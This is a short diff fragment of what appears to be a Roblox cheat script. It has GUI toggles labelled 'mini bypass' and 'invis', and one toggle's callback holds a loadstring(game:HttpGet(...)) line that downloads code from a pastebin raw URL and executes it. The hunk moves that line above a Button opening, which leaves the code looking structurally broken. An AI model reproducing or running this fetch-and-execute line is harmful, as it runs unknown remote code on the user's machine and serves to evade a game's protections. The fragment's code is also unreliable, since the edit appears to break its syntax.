@@ -491,8 +491,8 @@ Section1:Toggle({
     Description = "mini bypass",
     Default = false
     }, function(value)
-		Section1:Button({
 loadstring(game:HttpGet("https://pastebin.com/raw/piukyETa"))();
+		Section1:Button({
     Title = "invis",
     Description = "cant fire",
     Default = false
